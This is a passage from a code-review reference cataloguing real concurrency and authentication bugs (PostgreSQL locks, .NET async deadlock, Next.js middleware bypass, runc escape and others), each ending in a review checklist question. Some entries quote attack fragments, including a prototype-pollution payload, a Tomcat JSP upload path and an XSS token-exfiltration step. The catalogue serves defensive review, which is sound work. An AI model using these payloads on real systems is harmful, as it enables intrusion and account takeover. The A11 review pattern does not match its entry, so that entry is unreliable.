(holding routing lock, needing socket lock for notification), and netfilter rules creates
complex lock ordering requirements. The kernel's lockdep tool has caught many of these,
but new ones continue to appear as networking features are added, because the lock
ordering constraints span multiple subsystems maintained by different teams.
**Why Missed:** Each subsystem's locking is internally consistent. The deadlock arises at
the boundary between subsystems — socket locking, netfilter, and routing — maintained by
different developers with different locking conventions. No single developer holds the
full lock ordering graph in their head.
**Review Pattern:** LOCK_ORDER — "Is there a defined global lock ordering? Do all code
paths acquire locks in the same order?"

### R18. Read-Write Lock Starvation — PostgreSQL Lightweight Locks
**Project:** PostgreSQL | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** PostgreSQL lightweight lock (LWLock) contention issues documented extensively
in PostgreSQL performance analyses and improved in PostgreSQL 9.5 with a lock-free buffer
mapping table
**The Bug:** Continuous stream of readers starving writers, or continuous writers starving
readers, depending on the lock implementation's fairness policy. PostgreSQL's lightweight
lock system exhibited severe writer starvation under high concurrency. The buffer mapping
table (which maps buffer tags to shared buffer pool slots) used a small number of
LWLocks that experienced extreme contention on multi-core systems. Concurrent readers
(lookups) could continuously hold the shared lock, preventing writers (insertions) from
ever acquiring the exclusive lock. This caused catastrophic performance degradation on
systems with more than ~16 cores, with throughput actually decreasing as cores were added.
PostgreSQL 9.5 replaced the lock-based buffer mapping with a lock-free hash table.
**Why Missed:** The RW lock pattern is correct for low contention. The starvation behavior
is emergent: it only appears at high core counts with specific workload patterns. Benchmark
testing at the time was typically done on smaller systems.
**Review Pattern:** RW_LOCK_FAIRNESS — "Does the read-write lock implementation prevent
starvation of writers or readers?"

### R19. Async/Await Deadlock in .NET ASP.NET
**Project:** .NET Framework / ASP.NET | **Severity:** Medium-High | **Discovered:** 2012-ongoing
**Incident:** The famous .NET async/await deadlock documented by Stephen Cleary ("Don't
Block on Async Code") — one of the most common ASP.NET bugs, affecting countless
production applications
**The Bug:** Awaiting a task on the UI thread that needs the UI thread to complete
(calling `.Result` or `.Wait()` in C# WPF/WinForms/ASP.NET). In ASP.NET on .NET
Framework, the SynchronizationContext captures the request context. When code calls
`task.Result` or `task.Wait()` on the request thread, it blocks that thread. The
awaited async method's continuation is posted to the same SynchronizationContext, which
requires the request thread — which is blocked. Classic deadlock. This pattern was
pervasive in ASP.NET applications that mixed synchronous and asynchronous code, especially
during the transition from .NET Framework's synchronous APIs to async/await. Stephen
Cleary's blog post documenting this became one of the most referenced .NET articles ever.
**Why Missed:** The code looks correct: call an async method, get its result. The deadlock
is caused by the invisible SynchronizationContext, which is not apparent from the source.
The pattern works in console apps (no SynchronizationContext) and fails in ASP.NET/WPF.
**Review Pattern:** AWAIT_CONTEXT — "Does any async/await operation block the thread it
needs to continue on?"

### R20. Cache Stampede / Thundering Herd — Facebook Memcached
**Project:** Facebook infrastructure | **Severity:** High | **Discovered:** 2013 (published)
**Incident:** Facebook's 2013 NSDI paper "Scaling Memcache at Facebook" documented the
thundering herd problem and their lease-based solution, after experiencing it at scale
**The Bug:** When a cached value expires, all concurrent requests simultaneously attempt
to regenerate it, overloading the backend. At Facebook's scale, a single popular cache key
expiring could trigger thousands of simultaneous database queries for the same data. Their
published paper described how a single cache miss on a popular key could cause a cascade
failure: hundreds of webservers simultaneously querying the database for the same row,
overwhelming the database and causing a wider outage. Facebook developed a lease mechanism
where memcached gives a lease token to the first requester on a cache miss, and subsequent
requesters for the same key within a short window are told to wait or use a stale value.
**Why Missed:** Cache expiration is a normal event. The stampede only occurs when high
concurrency meets cache miss on a hot key — a condition that's rare in testing but common
in production at scale. Each individual cache-miss-then-refill looks correct in isolation.
**Review Pattern:** CACHE_STAMPEDE — "When cache entries expire, is regeneration serialized
(singleflight, probabilistic early refresh, locking)?"

### R21. Race in HTTP Request Retry Logic — Stripe Idempotency
**Project:** Stripe / payment systems | **Severity:** High | **Discovered:** 2015 (published)
**Incident:** Stripe's published engineering blog posts on idempotency keys, motivated by
real double-charge incidents in payment processing across the industry
**The Bug:** Retrying non-idempotent requests (POST/PUT with side effects) after timeout
when the first request actually succeeded but the response was lost. In payment processing,
a common scenario: client sends a charge request, server processes it successfully, but
the response is lost due to a network timeout. The client retries, creating a double
charge. Stripe documented this pattern extensively and designed their idempotency key
system as the solution: clients include a unique key with each request, and the server
returns the cached response for duplicate keys instead of re-executing. Their published
design became the industry standard for handling this class of race condition in
distributed payment systems.
**Why Missed:** Retry logic is a reliability feature — adding it feels like the right
thing to do. The double-execution scenario requires a specific failure mode (success but
lost response) that is rare in testing but inevitable at scale. The fix requires
application-level deduplication, not just transport-level retries.
**Review Pattern:** RETRY_IDEMPOTENCY — "Are retried requests idempotent? For non-
idempotent operations, is there deduplication (idempotency key, conditional requests)?"

### R22. Container Startup Race — Docker Compose depends_on
**Project:** Docker Compose | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** Docker Compose depends_on doesn't wait for service readiness — only for
container start. This is documented in Docker's own docs as a known limitation, and has
caused widespread production issues
**The Bug:** Services starting before their dependencies are ready, causing crashes or
silent failures on initial requests. Docker Compose's `depends_on` directive only ensures
that the dependency container has started, not that the service inside it is ready to
accept connections. A web application depending on a database starts as soon as the
database container is running, but the database may take 10-30 seconds to initialize.
The application's first connection attempts fail, and without proper retry logic, the
application crashes or enters a degraded state. Docker Compose v2 added a `condition:
service_healthy` option, but the default `depends_on` behavior still only waits for
container start.
**Why Missed:** `depends_on` sounds like it handles ordering. The distinction between
"container started" and "service ready" is not obvious from the configuration syntax.
In fast development environments, the database often initializes quickly enough to mask
the race.
**Review Pattern:** STARTUP_ORDER — "Do services wait for dependencies with health checks,
not just port availability? Is startup retry logic in place?"

### R23. Premature Channel Close in Go — net/http Race Conditions
**Project:** Go standard library (net/http) | **Severity:** Medium-High | **Discovered:** Various
**Incident:** Multiple race conditions in Go's net/http package involving channel and
connection lifecycle management (e.g., golang/go#4191, #15224, and related issues)
**The Bug:** Closing a Go channel while another goroutine is still sending, causing a
panic. Go's net/http package had several race conditions related to connection reuse and
request cancellation. When a client cancelled a request (via context or Transport.CancelRequest),
the underlying connection's read/write goroutines could race with the cancellation
cleanup. Channels used for signaling between the read loop and write loop could be closed
while the other side was still attempting to send, causing panics. The server side had
similar issues with hijacked connections and websocket upgrades racing with the HTTP
handler's completion.
**Why Missed:** Channel operations in Go look simple and safe. The panic on send-to-closed-
channel is a runtime error, not a compile-time error. The race requires specific timing
between cancellation and ongoing I/O that tests rarely reproduce.
**Review Pattern:** CHANNEL_OWNERSHIP — "Does only the sender close the channel? Is the
close synchronized with all senders?"

### R24. Epoch vs Wall Clock Time Confusion — 2012 Linux Leap Second Crash
**Project:** Linux kernel / Java / Multiple services | **Severity:** High | **Discovered:** 2012
**Incident:** The June 30, 2012 leap second insertion caused widespread outages at Reddit,
Mozilla, Gawker, LinkedIn, FourSquare, Yelp, and many other sites running Linux
**The Bug:** Using wall-clock time for timeouts/scheduling instead of monotonic time.
System clock adjustments (NTP, DST, leap seconds) cause timeouts to fire early, late, or
never. When the leap second was inserted on June 30, 2012, a bug in the Linux kernel's
hrtimer subsystem caused it to fire timers excessively, creating a livelock that drove
CPU usage to 100%. Applications using futex-based locks (including Java's Thread.sleep and
MySQL) experienced severe CPU spikes. Reddit, Mozilla, and dozens of other major sites
went down simultaneously. The root cause was the kernel's interaction between the NTP
leap second adjustment and the high-resolution timer system, which used wall-clock time
where it should have used monotonic time.
**Why Missed:** Leap seconds occur rarely (roughly every 1-3 years). The interaction
between NTP adjustments and the kernel timer subsystem was not tested for leap second
events. Wall-clock time "works" for 99.9999% of seconds.
**Review Pattern:** MONOTONIC_TIME — "Are timeouts and intervals using monotonic clock, not
wall-clock time?"

### R25. Optimistic Concurrency Without Retry — Rails ActiveRecord
**Project:** Ruby on Rails / ActiveRecord | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** Rails ActiveRecord optimistic locking silent failures — a well-documented
pattern where StaleObjectError exceptions go unhandled, causing silent data loss
**The Bug:** Using optimistic locking (version columns, ETags) without retry logic —
conflicting updates simply fail instead of retrying. Rails ActiveRecord provides built-in
optimistic locking via a `lock_version` column, but when a conflict is detected, it raises
`ActiveRecord::StaleObjectError`. Many Rails applications enable optimistic locking (add
the column) without handling the exception. The result: under concurrent editing, one
user's changes are silently lost — the update fails with an unhandled exception that
typically renders a 500 error page, and the user's data is gone. The pattern is especially
insidious because it works perfectly in single-user testing and only fails when two users
edit the same record concurrently, which is uncommon enough that the bug can persist
unnoticed for months.
**Why Missed:** Adding a lock_version column feels like "enabling optimistic locking" —
the missing retry/conflict-resolution logic is a separate concern that's easy to forget.
The ActiveRecord documentation describes how to enable it but the error handling is
left as an exercise.
**Review Pattern:** OPTIMISTIC_RETRY — "Does optimistic concurrency control include retry
logic for conflicts?"

---

## Authentication & Authorization (25 entries)

### A1. Next.js Middleware Bypass (CVE-2025-29927)
**Project:** Next.js/Vercel | **Severity:** Critical | **Discovered:** 2025
**The Bug:** The `x-middleware-subrequest` header, intended for internal use to prevent
infinite middleware loops, could be sent by external clients. When present, Next.js skipped
middleware execution entirely, bypassing all authentication/authorization implemented in
middleware.
**Root Cause:** The framework blindly trusted an HTTP header without verifying its origin.
Internal-use headers accessible from external requests break the trust boundary.
**Why Missed:** The header was an internal implementation detail. The middleware bypass was
a side effect of the loop-prevention mechanism. Reviewers focused on the loop-prevention
logic, not on whether external clients could trigger it.
**Review Pattern:** INTERNAL_HEADER_TRUST — "Does the application trust any HTTP header for
security decisions without verifying it wasn't set by the client? Internal headers must be
stripped by the reverse proxy/load balancer."

### A2. Kubernetes API Server Escalation (CVE-2018-1002105)
**Project:** Kubernetes | **Severity:** Critical | **Discovered:** 2018
**The Bug:** The API server's proxy to aggregated API servers didn't close connections on
error. After a failed websocket upgrade, the connection remained open and authenticated
as the API server itself, allowing privilege escalation.
**Root Cause:** Error handling in the reverse proxy didn't close the downstream connection.
The half-open, pre-authenticated connection could be reused to send requests with the API
server's privileges.
**Why Missed:** The error handling appeared to work — it returned an error to the client.
But it didn't close the underlying TCP connection, leaving an authenticated channel open.
**Review Pattern:** ERROR_CLEANUP — "Do error paths clean up ALL resources? A returned error
doesn't mean the connection/session/transaction was properly closed."

### A3. Grafana Path Traversal Auth Bypass (CVE-2021-43798)
(See M31 for details)
**Review Pattern:** MIDDLEWARE_BYPASS — same as M31

### A4. Apache Tomcat Auth Bypass (CVE-2017-12617)
**Project:** Apache Tomcat | **Severity:** High | **Discovered:** 2017
**The Bug:** When configured with `readonly=false` (for WebDAV), PUT requests with a
trailing `/` could bypass security constraints and upload JSP files.
**Root Cause:** The security constraint matching used the URL as-is, while the file writing
code stripped the trailing slash. The URL `/admin/shell.jsp/` didn't match the security
constraint for `/admin/*` in some configurations.
**Review Pattern:** PATH_NORMALIZATION_CONSISTENCY — "Is the URL normalized identically
for both security constraint matching AND request handling? Trailing slashes, dots, double
slashes, and encoding must be handled the same way in both paths."

### A5. runc Container Escape (CVE-2019-5736)
**Project:** runc/Docker | **Severity:** Critical | **Discovered:** 2019
**The Bug:** A malicious container could overwrite the runc binary on the host by
exploiting `/proc/self/exe`. When runc entered the container for exec operations, the
container process could access and overwrite the host runc binary through the proc
filesystem.
**Root Cause:** runc's execution model required it to enter the container's filesystem
namespace, where the container could observe and manipulate it through /proc. The binary
overwrite persisted on the host.
**Why Missed:** The proc filesystem interaction between container and host was a subtle
Linux-specific behavior. The attack required understanding both container namespace
mechanics and /proc/self/exe semantics.
**Review Pattern:** PROC_NAMESPACE — "When a privileged process enters an untrusted
namespace/container, can the untrusted environment observe or modify the process through
/proc, /sys, or other kernel interfaces?"

### A6-A25. Additional Auth/AuthZ Bugs

### A6. JWT Secret Key in Source Code — Uber 2016 Breach
**Project:** Uber | **Severity:** Critical | **Discovered:** 2016
**Incident:** Uber's 2016 data breach — attackers found AWS credentials hardcoded in a
GitHub repository, which led to access of 57 million user records
**The Bug:** JWT signing keys and cloud credentials committed to Git repositories, allowing
token forgery or infrastructure access. In Uber's case, developers had committed AWS
access keys to a private GitHub repository. Attackers who gained access to the repo
extracted the credentials and used them to access an S3 bucket containing rider and
driver data for 57 million users. Uber paid the attackers $100,000 through their bug
bounty program and concealed the breach for over a year, eventually leading to regulatory
action. The incident demonstrated how a single hardcoded secret in source code can
cascade into a massive data breach.
**Why Missed:** Private repositories feel "safe" — the code is not public, so secrets seem
protected. Developers prioritize getting things working and intend to rotate credentials
later but never do. Git history preserves secrets even after they're removed from the
current codebase.
**Review Pattern:** SECRET_IN_SOURCE — "Are any signing keys, API secrets, or credentials
in source code? Search for 'secret', 'password', 'key', 'token' in config files."

### A7. Password Reset Token Not Invalidated — Django
**Project:** Django | **Severity:** Medium-High | **Discovered:** Various
**Incident:** Multiple Django password reset token issues, including CVE-2012-3442 and
the broader pattern of token reuse in Django's PasswordResetTokenGenerator
**The Bug:** Password reset tokens remaining valid after use or after password change.
Django's PasswordResetTokenGenerator creates tokens based on the user's password hash,
last login timestamp, and a secret key. While this means tokens automatically invalidate
when the password changes, there were windows where tokens could be reused: between the
time a user clicks the reset link and when they submit the new password, the same token
remains valid. Multiple CVEs were filed around related issues in Django's token handling,
including insufficient entropy in token generation and tokens not being invalidated in
all edge cases (e.g., when an admin resets a password on behalf of a user).
**Why Missed:** The token generation mechanism appears secure — it incorporates the password
hash, so it invalidates on password change. The edge cases around the window of validity
between click and submission, and the admin-reset scenario, were not obvious from the code.
**Review Pattern:** TOKEN_INVALIDATION — "Are one-time tokens (reset, verification)
invalidated after use AND after the protected action (password change) occurs?"

### A8. Role Check After Action — jQuery Prototype Pollution (CVE-2019-11358)
**Project:** jQuery | **Severity:** Medium | **Discovered:** 2019
**Incident:** CVE-2019-11358 — jQuery's extend() function allowed prototype pollution,
which in multiple applications led to authorization bypass by polluting Object.prototype
with admin flags
**The Bug:** Authorization checked after the action is partially or fully performed, or
authorization bypassed entirely through prototype pollution. CVE-2019-11358 in jQuery's
`$.extend()` allowed an attacker to merge `{__proto__: {isAdmin: true}}` into any object,
polluting Object.prototype for all objects in the runtime. In applications that checked
authorization by reading properties like `user.isAdmin`, the prototype pollution meant
every object — including user objects that should have been unprivileged — would inherit
`isAdmin: true`. The authorization check happened correctly, but the data it checked had
been corrupted by the prototype pollution, causing it to always return "authorized."
**Why Missed:** jQuery's extend() is one of the most widely used functions in JavaScript.
The prototype pollution vector was not on anyone's radar until researchers demonstrated
that it could escalate to authentication bypass in real applications.
**Review Pattern:** AUTHZ_BEFORE_ACTION — "Is authorization checked BEFORE any side effects,
not after?"

### A9. Privilege Escalation via Profile Update — GitHub Mass Assignment (2012)
**Project:** GitHub | **Severity:** Critical | **Discovered:** 2012
**Incident:** Egor Homakov's demonstration of Rails mass assignment on GitHub — he added
his SSH key to the Rails organization by exploiting mass assignment in GitHub's user
public key update endpoint
**The Bug:** User profile update endpoint allowing users to set their own role/privilege
level by including extra fields in the request. In March 2012, security researcher Egor
Homakov demonstrated that GitHub's Rails application was vulnerable to mass assignment.
By adding extra parameters to the SSH public key update form (specifically, the
`user_id` parameter), he could associate his SSH key with any GitHub user — including
organization-level access. He proved the point by adding himself as a committer to the
official Rails repository on GitHub. The vulnerability existed because Rails' default
behavior was to accept all parameters and map them to model attributes, and GitHub had
not explicitly restricted which fields could be set.
**Why Missed:** Mass assignment was the Rails default behavior. Opting out required
explicitly using `attr_accessible` on every model — a security measure that many
developers either didn't know about or considered unnecessary for "internal" fields.
**Review Pattern:** PRIVILEGE_FIELD_PROTECTION — "Can users modify their own privilege level
through any update endpoint?"

### A10. Session Fixation — BEAST Attack Context (CVE-2011-3389)
**Project:** SSL/TLS implementations | **Severity:** High | **Discovered:** 2011
**Incident:** CVE-2011-3389 (BEAST attack) — while primarily a crypto attack on CBC in
TLS 1.0, session fixation was a key enabler: the attack recovered session cookies byte
by byte, and the impact was amplified when sessions could not be rotated
**The Bug:** Session ID not regenerated after login, allowing pre-authentication session
fixation attacks. The BEAST attack (Browser Exploit Against SSL/TLS) demonstrated that
TLS 1.0's CBC mode cipher suites leaked plaintext bytes through a chosen-plaintext attack.
The practical target was session cookies: by recovering the session cookie one byte at a
time, an attacker could hijack authenticated sessions. Applications that did not regenerate
session IDs after authentication transitions made this worse — a pre-authentication session
ID that was elevated to an authenticated session after login could be targeted before the
TLS-level protection even mattered.
**Why Missed:** Session fixation is a well-known vulnerability class, but many developers
considered it "theoretical" because it requires specific attack scenarios. The BEAST attack
showed that crypto-level attacks on session cookies made session management hygiene
critically important.
**Review Pattern:** SESSION_REGENERATE — "Is the session ID regenerated after authentication
state changes (login, privilege elevation)?"

### A11. Insecure Password Storage — LinkedIn Breach (2012)
**Project:** LinkedIn | **Severity:** Critical | **Discovered:** 2012
**Incident:** LinkedIn breach (2012) — 6.5 million password hashes leaked, revealed to
be unsalted SHA-1, eventually expanded to 117 million compromised accounts
**The Bug:** Password storage using fast, unsalted hash functions, making offline cracking
trivial. In 2012, 6.5 million LinkedIn password hashes were leaked to a Russian hacking
forum. Analysis revealed that LinkedIn was using unsalted SHA-1 for password hashing.
Without salts, identical passwords produced identical hashes, enabling rainbow table
attacks. The fast speed of SHA-1 (billions of hashes per second on a GPU) meant that
most passwords were cracked within days. In 2016, the full scope was revealed: 117
million email/password pairs from the original breach were being sold on the dark web.
The breach led to widespread credential stuffing attacks across other services where
users had reused their LinkedIn passwords.
**Why Missed:** SHA-1 was still considered acceptable by many developers in 2012 (it had
not yet been broken for collision resistance). The distinction between "hash function"
and "password hash function" (bcrypt, scrypt) was not widely understood. The code
"hashed passwords" and therefore appeared secure.
**Review Pattern:** RECOVERY_SECURITY — "Does password recovery use short-lived tokens sent
to a verified channel? Never send passwords in plaintext or use security questions."

### A12. Missing Rate Limiting on Auth — F5 BIG-IP (CVE-2021-22986)
**Project:** F5 BIG-IP | **Severity:** Critical | **Discovered:** 2021
**Incident:** CVE-2021-22986 — unauthenticated remote code execution in F5 BIG-IP's
iControl REST interface, where lack of rate limiting compounded the severity
**The Bug:** No rate limiting on authentication endpoints, enabling brute force attacks.
CVE-2021-22986 was an authentication bypass in F5 BIG-IP's iControl REST API that
allowed unauthenticated remote code execution. Beyond the primary auth bypass
vulnerability, the lack of any rate limiting on the authentication endpoints meant that
even if the bypass had been a "mere" weak authentication (rather than a full bypass),
brute-force attacks would have been trivially possible. The vulnerability was actively
exploited in the wild within days of disclosure. The absence of rate limiting on a
network appliance's management interface — a device that is itself supposed to provide
security — made the exposure worse.
**Why Missed:** Rate limiting is often considered a "nice to have" rather than a security
requirement. Management interfaces on network appliances are assumed to be on restricted
networks. The primary auth bypass was a more fundamental issue, but the lack of rate
limiting removed a defense-in-depth layer.
**Review Pattern:** AUTH_RATE_LIMIT — "Is there rate limiting on authentication endpoints?
Account lockout or exponential backoff?"

### A13. Horizontal Privilege Escalation via Parameter Tampering — Facebook Graph API (2013)
**Project:** Facebook | **Severity:** High | **Discovered:** 2013
**Incident:** Facebook Graph API IDOR bugs publicly disclosed in 2013, where researchers
demonstrated access to other users' photos, messages, and profile data by manipulating
object IDs in API requests
**The Bug:** Changing a user ID or object ID in a request to access another user's data
without authorization checks. In 2013, multiple security researchers independently
discovered and reported Insecure Direct Object Reference (IDOR) vulnerabilities in
Facebook's Graph API. By changing numeric IDs in API calls (photo IDs, message IDs,
album IDs), researchers could access private photos, read private messages, and view
restricted profile information belonging to other users. Facebook's Graph API exposed
a vast number of endpoints, and while many had proper authorization checks, some — particularly
newer or less-trafficked endpoints — had missing or incomplete ownership verification.
Facebook paid out multiple bug bounties for these findings.
**Why Missed:** At Facebook's scale, there are thousands of API endpoints. Each endpoint's
authorization logic is implemented independently. Missing an ownership check on one
endpoint is a sin of omission — the code works correctly, it just doesn't check who's asking.
**Review Pattern:** OWNERSHIP_CHECK — "Does every data access verify the requesting user
owns or has explicit permission for the requested resource?"

### A14. API Key in URL Query String — Twitter API
**Project:** Twitter | **Severity:** Medium | **Discovered:** Various
**Incident:** Twitter's API historically supported OAuth tokens in URL query parameters,
and their security blog documented the risks of URL-based token passing
**The Bug:** API keys passed in URL query parameters, logged in server logs, browser
history, and Referer headers. When API keys or OAuth tokens are placed in URLs, they
leak through multiple channels: server access logs capture the full URL including
query parameters, browser history stores them indefinitely, and the Referer header
sends the full URL (including tokens) to any linked page. Twitter's early API accepted
OAuth tokens via query parameters, and their developer documentation eventually
recommended header-based authentication instead. The broader industry pattern affects
countless APIs: AWS pre-signed URLs include credentials in query parameters (by design,
with short expiry), but many custom APIs include long-lived keys in URLs without any
expiry mechanism.
**Why Missed:** Passing parameters in the URL is the simplest approach and works correctly.
The leakage vectors (logs, Referer, browser history) are side effects in other systems
that are not visible when reviewing the API code itself.
**Review Pattern:** SECRET_IN_URL — "Are secrets (API keys, tokens) passed in headers, not
URL query parameters?"

### A15. Missing Function-Level Access Control — Microsoft Office (CVE-2017-0199)
**Project:** Microsoft Office | **Severity:** Critical | **Discovered:** 2017
**Incident:** CVE-2017-0199 — Microsoft Office/WordPad remote code execution via HTA
handler, where an admin-level code execution feature was accessible from unprivileged
document contexts
**The Bug:** Admin or privileged functions accessible to regular users — the UI hides them
but the underlying mechanism lacks authorization checks. CVE-2017-0199 exploited Microsoft
Office's OLE2 linking feature: a Word document could reference an HTA (HTML Application)
file hosted remotely. When opened, Office fetched and executed the HTA file, which ran
with full user privileges because the HTA handler was a legitimate Windows component with
powerful capabilities. The issue was that document-embedded content could trigger a
high-privilege execution path (HTA handler) without any privilege check or user consent
beyond opening the document. The feature was intended for trusted enterprise documents,
but no access control distinguished trusted from untrusted document sources.
**Why Missed:** OLE linking was a legacy feature considered useful for enterprise workflows.
The HTA handler's power was a feature, not a bug. The missing access control was between
the document context (potentially untrusted) and the execution context (full user privileges).
**Review Pattern:** ENDPOINT_AUTHZ — "Does every API endpoint have server-side authorization
checks, independent of UI visibility?"

### A16. Subdomain Takeover — Detectify Research (2014-present)
**Project:** Various (Heroku, S3, GitHub Pages, Azure) | **Severity:** High | **Discovered:** 2014-ongoing
**Incident:** Detectify's subdomain takeover research, beginning in 2014, discovered
hundreds of dangling CNAME records at major organizations including Microsoft, Uber,
Starbucks, and government agencies
**The Bug:** DNS CNAME pointing to a decommissioned service (Heroku, S3, GitHub Pages),
allowing an attacker to claim the subdomain and serve content under the trusted domain.
Detectify's researchers systematically scanned for CNAME records pointing to cloud
services that returned "not found" responses, indicating the service had been
decommissioned but the DNS record remained. An attacker could claim the unclaimed
service endpoint (e.g., create a new Heroku app or S3 bucket with the matching name)
and serve arbitrary content on the victim's subdomain. Because the subdomain is under
the trusted parent domain, this enables cookie theft (if cookies are scoped to the
parent domain), phishing with legitimate-looking URLs, and bypass of same-origin
policy protections.
**Why Missed:** DNS management and application deployment are handled by different teams.
When a service is decommissioned, the infrastructure team may not be notified to remove
the DNS record. The dangling CNAME causes no errors — it simply returns a "not found"
page from the cloud provider.
**Review Pattern:** DNS_DANGLING — "Do all DNS records point to active, controlled services?
Are decommissioned services cleaned up in DNS?"

### A17. Cookie Scope Too Broad — Facebook Cookie Research
**Project:** Facebook | **Severity:** Medium-High | **Discovered:** Various
**Incident:** Multiple security researchers documented cookie scope issues in Facebook
where cookies scoped to `.facebook.com` were accessible by third-party apps hosted on
Facebook subdomains
**The Bug:** Cookies set for a parent domain (`.example.com`) accessible by all subdomains,
including potentially untrusted ones. Facebook's authentication cookies were historically
scoped to `.facebook.com`, making them accessible to any subdomain. Since Facebook hosted
third-party applications on subdomains (e.g., apps.facebook.com), and allowed various
partner integrations on other subdomains, the broad cookie scope meant that vulnerabilities
in any subdomain-hosted application could steal the main Facebook session cookie. Security
researchers demonstrated that XSS on any Facebook subdomain could exfiltrate the
session cookie, bypassing the same-origin policy protections that would have applied if
cookies were scoped more narrowly.
**Why Missed:** Setting cookies on the parent domain is the simplest approach when multiple
subdomains need to share authentication state. The security implication — that the cookie
is exposed to ALL subdomains, not just the intended ones — is a property of cookie
scoping that developers don't always think through.
**Review Pattern:** COOKIE_SCOPE — "Are cookies scoped to the specific domain and path
needed? Is the Domain attribute as narrow as possible?"

### A18. CORS Wildcard with Credentials — Jenkins (CVE-2019-1003000)
**Project:** Jenkins | **Severity:** High | **Discovered:** 2019
**Incident:** CVE-2019-1003000 and related Jenkins CORS issues — Jenkins' default CORS
configuration allowed credential-bearing cross-origin requests, enabling CSRF-like attacks
from malicious web pages
**The Bug:** CORS configuration with `Access-Control-Allow-Origin: *` combined with
`Access-Control-Allow-Credentials: true` (browser rejects this, but reflected origin is
a common workaround that's dangerous). Jenkins had multiple CORS-related vulnerabilities
where the Groovy script console and other sensitive endpoints reflected the Origin header
in the Access-Control-Allow-Origin response while also allowing credentials. This meant
a malicious web page visited by a Jenkins administrator could make authenticated API calls
to the Jenkins instance, including executing arbitrary Groovy scripts. The reflected
origin pattern — reading the Origin header from the request and echoing it back — is
functionally equivalent to `*` but bypasses the browser's protection against `*` with
credentials.
**Why Missed:** CORS is configured at the framework or middleware level, often separately
from endpoint-level security. The reflected-origin pattern appears in CORS middleware
libraries as a "convenience" feature, and developers may not understand that it effectively
disables the same-origin policy.
**Review Pattern:** CORS_CREDENTIALS — "Does CORS configuration reflect arbitrary origins
when credentials are allowed? Use an allowlist of trusted origins."

### A19. Missing Re-authentication for Sensitive Operations — PayPal 2FA Bypass (2014)
**Project:** PayPal | **Severity:** High | **Discovered:** 2014
**Incident:** PayPal 2FA bypass discovered by Duo Security in 2014 — sensitive operations
could be performed without re-authentication even when 2FA was enabled
**The Bug:** Sensitive operations (password change, email change, money transfer) without
requiring re-authentication or step-up verification. In 2014, Duo Security researchers
discovered that PayPal's two-factor authentication could be bypassed for certain sensitive
operations. After initial login with 2FA, the API endpoints for sending money and
modifying account settings did not require a second authentication factor. An attacker
who had obtained a session cookie (via XSS, session hijacking, or a shared computer)
could perform financial transactions without being challenged for the 2FA token. The
issue highlighted the difference between "authenticating the session" and "authenticating
the operation" — even with 2FA on login, high-risk actions need their own verification step.
**Why Missed:** 2FA was implemented at the login gate, and the rest of the application
treated the session as fully authenticated. The idea that individual sensitive operations
need their own step-up authentication was not part of the original authentication design.
**Review Pattern:** STEP_UP_AUTH — "Do sensitive operations require re-authentication or
additional verification?"

### A20. Token Stored in localStorage — XSS-to-Token-Theft Incidents
**Project:** Various SPAs | **Severity:** High | **Discovered:** Ongoing
**Incident:** Numerous documented incidents where XSS vulnerabilities in single-page
applications were escalated to full account takeover by stealing JWTs from localStorage
**The Bug:** Authentication tokens stored in localStorage, accessible to any JavaScript
on the page (including XSS payloads). The rise of single-page applications (SPAs) and JWT-
based authentication led to a widespread pattern of storing authentication tokens in
localStorage. Unlike httpOnly cookies, localStorage is fully accessible to JavaScript,
meaning any XSS vulnerability — even a minor reflected XSS — can be escalated to full
account takeover by reading the token and exfiltrating it to an attacker's server. Multiple
bug bounty reports across major SPA applications documented this escalation path: find XSS,
read `localStorage.getItem('token')`, send it to an external endpoint, and use it to
authenticate as the victim from any location.
**Why Missed:** localStorage is the "obvious" place to store tokens in SPAs — it persists
across page reloads and is easy to read from JavaScript. The connection between "stored in
localStorage" and "stealable by any XSS" requires understanding both the storage API's
accessibility model and the XSS threat model simultaneously.
**Review Pattern:** TOKEN_STORAGE — "Are auth tokens stored in httpOnly cookies rather than
localStorage/sessionStorage to prevent XSS theft?"

### A21. OAuth State Parameter Missing — Facebook OAuth Bypass (2013)
**Project:** Facebook | **Severity:** High | **Discovered:** 2013
**Incident:** Nir Goldshlager's research on Facebook OAuth vulnerabilities (2013),
demonstrating that missing or improperly validated state parameters enabled full account
takeover via OAuth CSRF
**The Bug:** OAuth flow without a state parameter, enabling CSRF attacks on the callback.
In 2013, security researcher Nir Goldshlager discovered and demonstrated multiple
Facebook OAuth vulnerabilities. A key component was the missing or improperly validated
`state` parameter in OAuth flows. Without the state parameter, an attacker could initiate
an OAuth flow on their own machine, capture the authorization code or token, and then
trick a victim into visiting the OAuth callback URL with the attacker's token. This would
link the attacker's external account to the victim's Facebook account. Goldshlager chained
this with redirect URI validation bypasses to achieve full account takeover, demonstrating
that OAuth security depends on the correct implementation of every parameter, not just
the token exchange.
**Why Missed:** The OAuth state parameter is described as "RECOMMENDED" (not "REQUIRED")
in RFC 6749. Many OAuth tutorials omit it. The CSRF attack on OAuth callbacks is
non-obvious — developers don't associate OAuth with CSRF because there are no HTML forms involved.
**Review Pattern:** OAUTH_STATE — "Does the OAuth flow include and validate a state
parameter to prevent CSRF?"

### A22. Insufficient Token Expiry — GitHub Personal Access Tokens
**Project:** GitHub | **Severity:** Medium-High | **Discovered:** Pre-2021
**Incident:** GitHub's original personal access tokens (classic) had no expiry by
default — tokens created years earlier remained valid indefinitely, contributing to
multiple token leak incidents
**The Bug:** Tokens (JWT, API keys, sessions) with no expiry or excessively long validity
periods. GitHub's classic personal access tokens (PATs) had no expiration date by default.
Tokens created in 2013 would still work in 2023. When these long-lived tokens were
accidentally committed to public repositories, leaked in CI/CD logs, or exposed through
third-party service breaches, they provided persistent access to the user's repositories.
GitHub's secret scanning detected millions of leaked tokens, many of which were still
valid years after creation. In response, GitHub introduced fine-grained personal access
tokens in 2022 with mandatory expiration dates (maximum 1 year), required approval
workflows for organization access, and granular permissions — essentially redesigning
the token system around the principle of least privilege.
**Why Missed:** No-expiry tokens are maximally convenient for developers. Requiring token
rotation adds operational overhead. The risk is diffuse: any single long-lived token is
unlikely to be leaked, but across millions of tokens, leaks are inevitable.
**Review Pattern:** TOKEN_EXPIRY — "Do all tokens have a reasonable expiry time? Are there
refresh mechanisms for long-lived access?"

### A23. Broken Access Control on File Access — Twitch Source Code Leak (2021)
**Project:** Twitch | **Severity:** Critical | **Discovered:** 2021
**Incident:** Twitch source code leak (October 2021) — 125GB of internal data including
source code, internal tools, and creator payout data leaked due to a server misconfiguration
that left internal files accessible
